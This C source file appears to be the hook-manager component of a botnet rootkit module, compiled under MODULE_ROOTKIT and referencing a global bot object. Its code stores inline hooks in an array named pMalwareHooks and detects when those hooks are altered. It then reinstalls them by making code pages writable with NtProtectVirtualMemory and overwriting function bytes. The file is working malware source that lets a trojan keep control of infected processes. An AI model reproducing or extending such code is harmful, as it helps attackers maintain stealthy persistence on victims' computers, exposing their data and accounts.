#include "hook_manager.h"

#ifdef MODULE_ROOTKIT
#include "../common/mem.h"

extern bot_t bot;

static hook_t* pMalwareHooks = NULL;
static DWORD dwHookCount = 0;
static RTL_CRITICAL_SECTION csHooks;

void WINAPI InitHookManager(void)
{
	pMalwareHooks = NULL;
	dwHookCount = 0;
	CWA(RtlInitializeCriticalSection)(&csHooks);
}

void WINAPI HookManagerThreadSyncBegin(void)
{
	CWA(RtlEnterCriticalSection)(&csHooks);
}

void WINAPI HookManagerThreadSyncFinish(void)
{
	CWA(RtlLeaveCriticalSection)(&csHooks);
}

void WINAPI AddHook(hook_t hook)
{
	CWA(RtlEnterCriticalSection)(&csHooks);

	if(memreallocEx(&pMalwareHooks, sizeof(hook_t) * (dwHookCount + 1)))
	{
		if((hook.pHookData = (BYTE*)memalloc(hook.dwLength)) != NULL)
			memcopy(hook.pHookData, hook.lpFunctionAddress, hook.dwLength);

		memcopy(&pMalwareHooks[dwHookCount], &hook, sizeof(hook_t));
		dwHookCount++;
	}

	CWA(RtlLeaveCriticalSection)(&csHooks);
}

BOOL WINAPI IsAddressHooked(LPVOID lpAddress)
{
	BOOL bIsHooked;
	DWORD i;

	CWA(RtlEnterCriticalSection)(&csHooks);

	bIsHooked = FALSE;

	for(i = 0; i < dwHookCount; i++)
	{
		if(pMalwareHooks[i].lpFunctionAddress == lpAddress || pMalwareHooks[i].lpCallbackAddress == lpAddress)
		{
			bIsHooked = TRUE;
			break;
		}
	}

	CWA(RtlLeaveCriticalSection)(&csHooks);

	return bIsHooked;
}

BYTE* WINAPI GetOriginalByAddress(LPVOID lpAddress, PDWORD pdwLength)
{
	BYTE* lpOriginal;
	DWORD i;

	CWA(RtlEnterCriticalSection)(&csHooks);
	
	for(i = 0; i < dwHookCount; i++)
	{
		if(pMalwareHooks[i].lpFunctionAddress == lpAddress)
		{
			if((lpOriginal = (BYTE*)memalloc(pMalwareHooks[i].dwLength)) != NULL)
			{
				memcopy(lpOriginal, *pMalwareHooks[i].lpOriginalFunction, pMalwareHooks[i].dwLength);
				*pdwLength = pMalwareHooks[i].dwLength;
			}
			break;
		}
	}

	CWA(RtlLeaveCriticalSection)(&csHooks);

	return lpOriginal;
}

DWORD WINAPI GetHookCount(void)
{
	return dwHookCount;
}

BOOL WINAPI IsHookManipulated(DWORD iIndex)
{
	DWORD i;
	BOOL bIsManipulated;
	hook_t hook;
	BYTE* pCurrentData;

	bIsManipulated = FALSE;

	memzero(&hook, sizeof(hook_t));
	hook = pMalwareHooks[iIndex];

	if((pCurrentData = memalloc(hook.dwLength)) != NULL)
	{
		memcopy(pCurrentData, hook.lpFunctionAddress, hook.dwLength);

		for(i = 0; i < hook.dwLength; i++)
		{
			if(pCurrentData[i] != hook.pHookData[i])
			{
				bIsManipulated = TRUE;
				break;
			}
		}
	}

	return bIsManipulated;
}

void WINAPI ReplaceFunction(DWORD dwFunctionAddress, const BYTE* pBuffer, DWORD dwLength)
{
	DWORD dwOldProtect;

	/*if(!CWA(VirtualProtect)((LPVOID)dwFunctionAddress, dwLength, PAGE_EXECUTE_READWRITE, &dwOldProtect))
		return;
	*/

	if(CWA(NtProtectVirtualMemory)(CURRENT_PROCESS, (LPVOID)dwFunctionAddress, dwLength, PAGE_EXECUTE_READWRITE, &dwOldProtect) >= 0)
	{
		memcopy( (LPVOID)dwFunctionAddress, (LPCVOID)pBuffer, dwLength );

		CWA(NtProtectVirtualMemory)(CURRENT_PROCESS, (LPVOID)dwFunctionAddress, dwLength, dwOldProtect, &dwOldProtect);
	}
}

void WINAPI ReinstallHook(DWORD dwIndex)
{
	hook_t hook;

	hook = pMalwareHooks[dwIndex];

	ReplaceFunction((DWORD)hook.lpFunctionAddress, hook.pHookData, hook.dwLength);
}
#endif